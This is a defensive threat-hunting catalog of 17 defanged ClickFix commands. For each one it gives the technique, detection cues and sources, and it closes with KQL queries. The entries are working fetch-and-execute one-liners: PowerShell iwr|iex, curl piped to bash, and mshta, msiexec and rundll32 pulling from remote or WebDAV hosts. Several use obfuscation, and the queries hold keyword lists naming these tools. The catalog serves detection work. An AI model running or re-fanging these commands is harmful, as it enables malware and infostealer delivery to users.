# ClickFix Command Catalog

> ⚠️ **Defensive use only.** Every command below is a **DEFANGED** malicious sample kept for
> **detection engineering and threat hunting**. URLs are neutralised (`hxxp`, `[.]`). **Do not execute.**

ClickFix is a social-engineering technique where a victim is tricked (fake CAPTCHA / Cloudflare
check, browser or document "error") into pasting and running an attacker-supplied command in the
Windows **Run** dialog, PowerShell or a terminal. The payload runs with the user's own permissions.

- **Entries:** 17
- **Last updated:** 2026-08-14
- **Maintained by:** PAI ClickFix Tracker (daily) · source: [Sergio-Albea-Git/Threat-Hunting-KQL-Queries](https://github.com/Sergio-Albea-Git/Threat-Hunting-KQL-Queries)

## Commands

| ID | Executor | Technique | Source |
| --- | --- | --- | --- |
| cf-0001 | `powershell.exe` | Clipboard self-execution — reads clipboard, clears it, and pipes to iex twice | Group-IB / Sekoia |
| cf-0002 | `regsvr32.exe` | Fake Cloudflare CAPTCHA variant — stores creds with cmdkey, loads a DLL filelessly from an attacker SMB/UNC share; persistence via scheduled task 'RunNotepadNow' | CyberProof (via Mallory / Rapid7 reporting) |
| cf-0003 | `mshta.exe` | Remote HTA execution launched from the Run dialog after a fake 'verification' step | Huntress |
| cf-0004 | `conhost.exe` | conhost --headless used to run a hidden PowerShell downloader without a visible window | Huntress / Sekoia |
| cf-0005 | `curl.exe` | Native curl download of a payload to %TEMP% then immediate execution | Group-IB |
| cf-0006 | `bitsadmin.exe` | BITS transfer used to fetch the payload, evading some download monitoring | Huntress |
| cf-0007 | `powershell.exe` | Base64 -EncodedCommand to hide the real downloader/stager from casual inspection | CyberCentaurs |
| cf-0008 | `msiexec.exe` | Silent install of a remote MSI hosted on attacker infrastructure | Group-IB |
| cf-0009 | `rundll32.exe` | rundll32 loading an exported entry point from a DLL on a remote UNC/WebDAV share | Sekoia |
| cf-0010 | `pcalua.exe` | Program Compatibility Assistant used as a proxy to launch a remote binary and break the parent-child chain | Huntress |
| cf-0011 | `wt.exe` | Fake CAPTCHA instructs Windows+X then I to open Windows Terminal (wt.exe) instead of Run, then paste/run PowerShell in a privileged shell that blends into admin workflows | Microsoft Threat Intelligence (Defender Experts) |
| cf-0012 | `cmd.exe` | Fake Claude AI installer (MSIX) ClickFix; cmd splits the string 'powershell' across env vars with delayed expansion and calls 32-bit SysWOW64 PowerShell -E to evade string/path signatures | Rapid7 |
| cf-0013 | `powershell.exe` | ClickFix PowerShell loader uses runtime string substitution to indirectly construct irm (Invoke-RestMethod) and iex, fetching staged content executed in-memory without touching disk | Arctic Wolf |
| cf-0014 | `cscript.exe` | ClickFix (Latrodectus) pastes a curl.exe download of a JavaScript file to %TEMP%, then executes it via cscript to launch the loader | Palo Alto Unit 42 |
| cf-0015 | `bash (Terminal)` | macOS ClickFix fake CAPTCHA; Terminal one-liner silently downloads a DMG to /tmp, mounts it with hdiutil -nobrowse, and auto-launches the bundled Atomic Stealer (AMOS) app | BleepingComputer / Microsoft Threat Intelligence |
| cf-0016 | `bash (via Script Editor / Terminal)` | Evolved macOS ClickFix retrieves a remote script from a /curl/<id> endpoint and pipes straight to bash through multi-stage scripts, increasingly launched via Script Editor rather than Terminal, ending in AMOS | Jamf Threat Labs / Microsoft Threat Intelligence |
| cf-0017 | `rundll32.exe` | ACR Stealer ClickFix mounts an attacker WebDAV share over HTTPS with pushd, then rundll32 loads a remote DLL (odd extension e.g. .ct) directly from the DavWWWRoot mount | Microsoft Threat Intelligence |

### cf-0001 — `powershell.exe`

```text
powershell -ep bypass -c "$repvar=(Get-Clipboard);Set-Clipboard;$repvar|iex|iex"
```

- **Technique:** Clipboard self-execution — reads clipboard, clears it, and pipes to iex twice
- **Detection:** PowerShell that calls Get-Clipboard then Invoke-Expression/iex in the same command line. Set-Clipboard with no argument (clipboard wipe) is a strong secondary signal.
- **Source:** Group-IB / Sekoia — hxxps://blog.sekoia[.]io/clickfix-tactic-revenge-of-detection/
- **Added:** 2026-08-12

### cf-0002 — `regsvr32.exe`

```text
cmdkey /add:<host> /user:<user> /pass:<pass> & regsvr32 /s \\<host>\share\payload.dll
```

- **Technique:** Fake Cloudflare CAPTCHA variant — stores creds with cmdkey, loads a DLL filelessly from an attacker SMB/UNC share; persistence via scheduled task 'RunNotepadNow'
- **Detection:** regsvr32 loading a DLL from a UNC/SMB path (\\host\...); cmdkey /add immediately before; creation of scheduled task named RunNotepadNow.
- **Source:** CyberProof (via Mallory / Rapid7 reporting) — hxxps://www.mallory[.]ai/stories/019c8f86-2a83-7716-b011-53cf9e940c23
- **Added:** 2026-08-12

### cf-0003 — `mshta.exe`

```text
mshta hxxps://malicious[.]site/verify.hta
```

- **Technique:** Remote HTA execution launched from the Run dialog after a fake 'verification' step
- **Detection:** mshta.exe with a remote http(s) URL argument, spawned with a parent of explorer.exe (Run dialog) or a browser.
- **Source:** Huntress — hxxps://www.huntress[.]com/blog/dont-sweat-clickfix-techniques
- **Added:** 2026-08-12

### cf-0004 — `conhost.exe`

```text
conhost --headless powershell -w hidden -c "iex(iwr hxxps://bad[.]site/a)"
```

- **Technique:** conhost --headless used to run a hidden PowerShell downloader without a visible window
- **Detection:** Any execution of conhost.exe with the --headless argument is almost always malicious in this context.
- **Source:** Huntress / Sekoia — hxxps://www.huntress[.]com/blog/dont-sweat-clickfix-techniques
- **Added:** 2026-08-12

### cf-0005 — `curl.exe`

```text
curl hxxp://bad[.]site/a.exe -o %TEMP%\a.exe & start %TEMP%\a.exe
```

- **Technique:** Native curl download of a payload to %TEMP% then immediate execution
- **Detection:** curl.exe writing to %TEMP%/%APPDATA% followed by start/execution of the same path within seconds, parented off the Run dialog.
- **Source:** Group-IB — hxxps://www.group-ib[.]com/blog/clickfix-the-social-engineering-technique-hackers-use-to-manipulate-victims/
- **Added:** 2026-08-12

### cf-0006 — `bitsadmin.exe`

```text
bitsadmin /transfer job hxxp://bad[.]site/a.exe %TEMP%\a.exe & %TEMP%\a.exe
```

- **Technique:** BITS transfer used to fetch the payload, evading some download monitoring
- **Detection:** bitsadmin /transfer to a user-writable path followed by execution; also visible as BITS job creation events.
- **Source:** Huntress — hxxps://www.huntress[.]com/blog/dont-sweat-clickfix-techniques
- **Added:** 2026-08-12

### cf-0007 — `powershell.exe`

```text
powershell -w hidden -EncodedCommand <base64>
```

- **Technique:** Base64 -EncodedCommand to hide the real downloader/stager from casual inspection
- **Detection:** powershell.exe with -EncodedCommand / -enc and -w hidden, especially with a RunMRU-originated parent chain. Decode the blob for the true command.
- **Source:** CyberCentaurs — hxxps://cybercentaurs[.]com/blog/clickfix-malvertising-detection-threat-hunting/
- **Added:** 2026-08-12

### cf-0008 — `msiexec.exe`

```text
msiexec /q /i hxxps://bad[.]site/pkg.msi
```

- **Technique:** Silent install of a remote MSI hosted on attacker infrastructure
- **Detection:** msiexec.exe /i with a remote http(s) URL and /q (quiet); rare in normal user activity from the Run dialog.
- **Source:** Group-IB — hxxps://www.group-ib[.]com/blog/clickfix-the-social-engineering-technique-hackers-use-to-manipulate-victims/
- **Added:** 2026-08-12

### cf-0009 — `rundll32.exe`

```text
rundll32 \\<host>\share\p.dll,Entry
```

- **Technique:** rundll32 loading an exported entry point from a DLL on a remote UNC/WebDAV share
- **Detection:** rundll32.exe with a UNC/WebDAV (\\host\... or \\host@SSL\...) module path and an export name.
- **Source:** Sekoia — hxxps://blog.sekoia[.]io/clickfix-tactic-revenge-of-detection/
- **Added:** 2026-08-12

### cf-0010 — `pcalua.exe`

```text
pcalua -a \\<host>\share\p.exe
```

- **Technique:** Program Compatibility Assistant used as a proxy to launch a remote binary and break the parent-child chain
- **Detection:** pcalua.exe -a launching a binary, especially from a UNC path; unusual outside legacy-app troubleshooting.
- **Source:** Huntress — hxxps://www.huntress[.]com/blog/dont-sweat-clickfix-techniques
- **Added:** 2026-08-12

### cf-0011 — `wt.exe`

```text
wt.exe -p "Windows PowerShell" powershell -NoProfile -W Hidden -c "iwr hxxps://enhanceblabber[.]cc/v | iex"
```

- **Technique:** Fake CAPTCHA instructs Windows+X then I to open Windows Terminal (wt.exe) instead of Run, then paste/run PowerShell in a privileged shell that blends into admin workflows
- **Detection:** Alert on wt.exe spawning powershell.exe/pwsh with network cmdlets (iwr/irm/iex); Terminal is rarely a parent of scripted download-and-execute
- **Source:** Microsoft Threat Intelligence (Defender Experts) — hxxps://x[.]com/MsftSecIntel/status/2029692925118992473
- **Added:** 2026-02-01

### cf-0012 — `cmd.exe`

```text
cmd.exe /v:on /c "set x=pow&&set y=ershell&&call %windir%\SysWOW64\WindowsPowershell\v1.0\!x!!y! -E <base64>"
```

- **Technique:** Fake Claude AI installer (MSIX) ClickFix; cmd splits the string 'powershell' across env vars with delayed expansion and calls 32-bit SysWOW64 PowerShell -E to evade string/path signatures
- **Detection:** Hunt cmd.exe with /v:on and set-variable concatenation building 'powershell', or SysWOW64\...\v1.0\powershell.exe launched from cmd with -E/-EncodedCommand
- **Source:** Rapid7 — hxxps://www[.]rapid7[.]com/blog/post/ve-clickfix-phishing-campaign-fake-claude-installer/
- **Added:** 2026-07-01

### cf-0013 — `powershell.exe`

```text
powershell -c "$m='ir'+'m';$e='ie'+'x';& $m hxxp://ghliczx[.]com/2[.]txt | & $e"
```

- **Technique:** ClickFix PowerShell loader uses runtime string substitution to indirectly construct irm (Invoke-RestMethod) and iex, fetching staged content executed in-memory without touching disk
- **Detection:** Flag PowerShell where cmdlet names are assembled via concatenation ('ir'+'m','ie'+'x') and invoked with & ; correlate with outbound GET to /1.txt or /2.txt style stagers
- **Source:** Arctic Wolf — hxxps://arcticwolf[.]com/resources/blog/clickfix-campaign-exploits-powershell-loader-with-identifier-obfuscation-for-malicious-activity/
- **Added:** 2026-06-01

### cf-0014 — `cscript.exe`

```text
curl.exe hxxp://<c2>/x.js -o %TEMP%\x.js & cscript %TEMP%\x.js
```

- **Technique:** ClickFix (Latrodectus) pastes a curl.exe download of a JavaScript file to %TEMP%, then executes it via cscript to launch the loader
- **Detection:** Hunt curl.exe writing .js to %TEMP%/Downloads immediately followed by cscript/wscript executing that file; cscript with a user-writable path argument is high-signal
- **Source:** Palo Alto Unit 42 — hxxps://unit42[.]paloaltonetworks[.]com/preventing-clickfix-attack-vector/
- **Added:** 2025-11-01

### cf-0015 — `bash (Terminal)`

```text
curl -fsSL hxxps://svs-verificationdate[.]beer/<id> -o /tmp/<rand>.dmg && hdiutil attach -nobrowse /tmp/<rand>.dmg && open /Volumes/*/NNApp.app
```

- **Technique:** macOS ClickFix fake CAPTCHA; Terminal one-liner silently downloads a DMG to /tmp, mounts it with hdiutil -nobrowse, and auto-launches the bundled Atomic Stealer (AMOS) app
- **Detection:** On macOS EDR, alert on curl -fsSL writing .dmg to /tmp followed by hdiutil attach -nobrowse and open of an app under /Volumes; chain within seconds of Terminal launch
- **Source:** BleepingComputer / Microsoft Threat Intelligence — hxxps://www[.]bleepingcomputer[.]com/news/security/new-macos-clickfix-attack-silently-mounts-dmgs-to-push-infostealer/
- **Added:** 2026-08-05

### cf-0016 — `bash (via Script Editor / Terminal)`

```text
curl -fsSL hxxps://<domain>/curl/<id> | bash
```

- **Technique:** Evolved macOS ClickFix retrieves a remote script from a /curl/<id> endpoint and pipes straight to bash through multi-stage scripts, increasingly launched via Script Editor rather than Terminal, ending in AMOS
- **Detection:** Hunt curl piped directly to bash/sh with a /curl/ URL path; flag osascript/Script Editor (com.apple.ScriptEditor2) spawning curl or bash as anomalous parent
- **Source:** Jamf Threat Labs / Microsoft Threat Intelligence — hxxps://www[.]jamf[.]com/blog/clickfix-macos-script-editor-atomic-stealer/
- **Added:** 2026-05-06

### cf-0017 — `rundll32.exe`

```text
pushd \\looksta[.]icu@SSL\DavWWWRoot & rundll32 google.ct,Entry & popd
```

- **Technique:** ACR Stealer ClickFix mounts an attacker WebDAV share over HTTPS with pushd, then rundll32 loads a remote DLL (odd extension e.g. .ct) directly from the DavWWWRoot mount
- **Detection:** Alert on pushd to a \\host@SSL\DavWWWRoot UNC path and rundll32 loading a DLL with a non-.dll extension from a WebClient/WebDAV-mounted drive
- **Source:** Microsoft Threat Intelligence — hxxps://www[.]microsoft[.]com/en-us/security/blog/2026/07/16/acr-stealer-two-observed-intrusion-chains-amid-increased-threat-activity/
- **Added:** 2026-07-16

## Threat Hunting (KQL — Microsoft Defender XDR)

```kusto
// 1) ClickFix executors launched from the Run dialog (explorer.exe parent)
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("explorer.exe","cmd.exe")
| where FileName in~ ("powershell.exe","mshta.exe","conhost.exe","regsvr32.exe","rundll32.exe","curl.exe","bitsadmin.exe","msiexec.exe","pcalua.exe")
| where ProcessCommandLine has_any ("Get-Clipboard","--headless","-enc","EncodedCommand","iex","iwr","http","\\\\","cmdkey","regsvr32","mshta")
| project Timestamp, DeviceName, AccountUpn=InitiatingProcessAccountUpn, FileName, ProcessCommandLine

// 2) The classic clipboard self-exec (Get-Clipboard piped to iex)
DeviceProcessEvents
| where ProcessCommandLine has "Get-Clipboard" and ProcessCommandLine has_any ("iex","Invoke-Expression")

// 3) conhost headless is almost always malicious here
DeviceProcessEvents | where ProcessCommandLine has "--headless"

// 4) Forensic: the pasted command lands in RunMRU
DeviceRegistryEvents
| where RegistryKey has @"Explorer\RunMRU"
| where RegistryValueData has_any ("powershell","mshta","curl","regsvr32","rundll32","bitsadmin","msiexec","conhost")
```

> Tune out legitimate admin/maintenance use; the strongest signal is a Run-dialog parent chain plus
> a remote/UNC fetch or a clipboard-to-`iex` pattern.

